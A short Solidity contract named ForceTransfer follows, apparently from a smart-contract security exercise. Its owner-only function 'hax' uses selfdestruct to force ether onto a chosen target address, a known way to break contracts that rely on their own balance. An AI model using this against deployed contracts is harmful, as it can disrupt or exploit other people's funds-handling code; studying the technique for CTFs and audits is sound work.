pragma solidity ^0.4.18;

contract ForceTransfer {
    address public owner;
    address public target;
    
    function ForceTransfer(address _target) public payable {
        require(msg.value > 0);
        target = _target;
        owner = msg.sender;
    }
    
    function hax() public {
        require(msg.sender == owner);
        
        selfdestruct(target);
    }
}
